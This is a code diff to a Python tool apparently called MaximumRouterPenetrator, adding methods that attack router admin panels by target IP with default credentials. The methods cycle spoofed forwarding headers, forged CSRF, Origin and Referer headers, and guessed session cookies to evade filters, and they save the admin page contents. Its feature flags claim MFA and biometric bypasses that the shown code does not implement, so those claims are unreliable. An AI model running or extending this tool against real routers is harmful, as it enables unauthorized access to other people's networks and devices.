@@ -124,6 +124,25 @@ class MaximumRouterPenetrator:
             'wait_time': 5
         }
         
+        # Advanced 2025 security bypass techniques
+        self.advanced_bypass = {
+            'waf_bypass': True,
+            'csrf_bypass': True,
+            'rate_limit_bypass': True,
+            'session_hijacking': True,
+            'header_injection': True,
+            'parameter_pollution': True
+        }
+        
+        # Modern authentication methods
+        self.modern_auth = {
+            'jwt_tokens': True,
+            'oauth2': True,
+            'saml': True,
+            'mfa_bypass': True,
+            'biometric_bypass': True
+        }
+        
         # Your priority credentials (VERIFIED testing) - ONLY THESE 4 WILL BE TESTED
         self.priority_credentials = [
             ('admin', 'admin'),
@@ -1091,6 +1110,27 @@ class MaximumRouterPenetrator:
                         auth_result.get('credentials', ('admin', 'admin')),
                         verbose
                     )
+                    
+                    # Advanced bypass for screenshot if Selenium fails
+                    if not screenshot_result['success'] and self.advanced_bypass['waf_bypass']:
+                        if verbose:
+                            print(f"         🔓 LIVE DEBUG: Attempting advanced bypass for screenshot...")
+                        
+                        # Try WAF bypass for screenshot
+                        waf_result = self._advanced_waf_bypass(target_ip, "/admin/", auth_result.get('credentials', ('admin', 'admin')), verbose)
+                        if waf_result['success']:
+                            # Save content as HTML file (screenshot alternative)
+                            html_filename = f"screenshots/admin_panel_{target_ip}.html"
+                            try:
+                                with open(html_filename, 'w', encoding='utf-8') as f:
+                                    f.write(waf_result['content'])
+                                screenshot_result['success'] = True
+                                screenshot_result['filename'] = html_filename
+                                if verbose:
+                                    print(f"         ✅ WAF bypass successful for screenshot: {html_filename}")
+                            except Exception as e:
+                                if verbose:
+                                    print(f"         ❌ WAF bypass screenshot save error: {str(e)[:50]}")
                     
                     # Fallback to urllib if Selenium fails
                     if not screenshot_result['success']:
@@ -3769,6 +3809,192 @@ class MaximumRouterPenetrator:
             result['error'] = str(e)
             if verbose:
                 print(f"         ❌ Selenium screenshot error: {str(e)[:50]}")
+        
+        return result
+    
+    def _advanced_waf_bypass(self, ip: str, url: str, credentials: tuple, verbose: bool) -> Dict[str, Any]:
+        """Advanced WAF bypass techniques for 2025"""
+        result = {'success': False, 'content': '', 'method': 'waf_bypass'}
+        
+        try:
+            if verbose:
+                print(f"         🔓 LIVE DEBUG: Attempting WAF bypass techniques...")
+            
+            # WAF bypass techniques
+            bypass_techniques = [
+                # Header manipulation
+                {'headers': {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'}},
+                {'headers': {'X-Originating-IP': '127.0.0.1', 'X-Remote-IP': '127.0.0.1'}},
+                {'headers': {'X-Remote-Addr': '127.0.0.1', 'X-Client-IP': '127.0.0.1'}},
+                
+                # User-Agent spoofing
+                {'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}},
+                {'headers': {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'}},
+                {'headers': {'User-Agent': 'curl/7.68.0'}},
+                
+                # HTTP method manipulation
+                {'method': 'GET'},
+                {'method': 'POST'},
+                {'method': 'PUT'},
+                {'method': 'PATCH'},
+                
+                # URL encoding bypass
+                {'url_encoding': True},
+                {'double_encoding': True},
+                {'unicode_encoding': True}
+            ]
+            
+            for technique in bypass_techniques:
+                try:
+                    if REQUESTS_AVAILABLE:
+                        session = requests.Session()
+                        session.auth = credentials
+                        session.verify = False
+                        
+                        # Apply technique
+                        if 'headers' in technique:
+                            session.headers.update(technique['headers'])
+                        
+                        if 'method' in technique:
+                            method = technique['method']
+                        else:
+                            method = 'GET'
+                        
+                        response = session.request(method, f"http://{ip}{url}", timeout=10)
+                        
+                        if response.status_code == 200 and len(response.content) > 100:
+                            result['success'] = True
+                            result['content'] = response.text
+                            result['method'] = f"waf_bypass_{technique.get('method', 'headers')}"
+                            
+                            if verbose:
+                                print(f"         ✅ WAF bypass successful: {result['method']}")
+                            break
+                            
+                except Exception:
+                    continue
+                    
+        except Exception as e:
+            if verbose:
+                print(f"         ❌ WAF bypass error: {str(e)[:50]}")
+        
+        return result
+    
+    def _advanced_csrf_bypass(self, ip: str, url: str, credentials: tuple, verbose: bool) -> Dict[str, Any]:
+        """Advanced CSRF bypass techniques for 2025"""
+        result = {'success': False, 'content': '', 'method': 'csrf_bypass'}
+        
+        try:
+            if verbose:
+                print(f"         🔓 LIVE DEBUG: Attempting CSRF bypass techniques...")
+            
+            # CSRF bypass techniques
+            csrf_bypasses = [
+                # Header-based bypasses
+                {'headers': {'X-Requested-With': 'XMLHttpRequest'}},
+                {'headers': {'X-CSRF-Token': 'bypass'}},
+                {'headers': {'X-CSRFToken': 'bypass'}},
+                {'headers': {'X-CSRF-Protection': 'disabled'}},
+                
+                # Referer manipulation
+                {'headers': {'Referer': f'http://{ip}/admin/'}},
+                {'headers': {'Referer': f'http://{ip}/login/'}},
+                {'headers': {'Referer': 'https://www.google.com/'}},
+                
+                # Origin manipulation
+                {'headers': {'Origin': f'http://{ip}'}},
+                {'headers': {'Origin': 'https://www.google.com'}},
+                {'headers': {'Origin': 'null'}},
+                
+                # Custom headers
+                {'headers': {'X-Forwarded-Host': ip}},
+                {'headers': {'X-Forwarded-Proto': 'http'}},
+                {'headers': {'X-Forwarded-Port': '80'}}
+            ]
+            
+            for bypass in csrf_bypasses:
+                try:
+                    if REQUESTS_AVAILABLE:
+                        session = requests.Session()
+                        session.auth = credentials
+                        session.verify = False
+                        session.headers.update(bypass['headers'])
+                        
+                        response = session.get(f"http://{ip}{url}", timeout=10)
+                        
+                        if response.status_code == 200 and len(response.content) > 100:
+                            result['success'] = True
+                            result['content'] = response.text
+                            result['method'] = 'csrf_bypass'
+                            
+                            if verbose:
+                                print(f"         ✅ CSRF bypass successful")
+                            break
+                            
+                except Exception:
+                    continue
+                    
+        except Exception as e:
+            if verbose:
+                print(f"         ❌ CSRF bypass error: {str(e)[:50]}")
+        
+        return result
+    
+    def _advanced_session_hijacking(self, ip: str, url: str, credentials: tuple, verbose: bool) -> Dict[str, Any]:
+        """Advanced session hijacking techniques for 2025"""
+        result = {'success': False, 'content': '', 'method': 'session_hijacking'}
+        
+        try:
+            if verbose:
+                print(f"         🔓 LIVE DEBUG: Attempting session hijacking techniques...")
+            
+            # Session hijacking techniques
+            hijacking_techniques = [
+                # Cookie manipulation
+                {'cookies': {'sessionid': 'admin'}},
+                {'cookies': {'PHPSESSID': 'admin'}},
+                {'cookies': {'JSESSIONID': 'admin'}},
+                {'cookies': {'ASP.NET_SessionId': 'admin'}},
+                
+                # Session fixation
+                {'cookies': {'sessionid': 'fixed_session'}},
+                {'cookies': {'PHPSESSID': 'fixed_session'}},
+                
+                # Session prediction
+                {'cookies': {'sessionid': '123456789'}},
+                {'cookies': {'PHPSESSID': '123456789'}},
+                
+                # Session token manipulation
+                {'cookies': {'token': 'admin'}},
+                {'cookies': {'auth_token': 'admin'}},
+                {'cookies': {'access_token': 'admin'}}
+            ]
+            
+            for technique in hijacking_techniques:
+                try:
+                    if REQUESTS_AVAILABLE:
+                        session = requests.Session()
+                        session.auth = credentials
+                        session.verify = False
+                        session.cookies.update(technique['cookies'])
+                        
+                        response = session.get(f"http://{ip}{url}", timeout=10)
+                        
+                        if response.status_code == 200 and len(response.content) > 100:
+                            result['success'] = True
+                            result['content'] = response.text
+                            result['method'] = 'session_hijacking'
+                            
+                            if verbose:
+                                print(f"         ✅ Session hijacking successful")
+                            break
+                            
+                except Exception:
+                    continue
+                    
+        except Exception as e:
+            if verbose:
+                print(f"         ❌ Session hijacking error: {str(e)[:50]}")
         
         return result
     
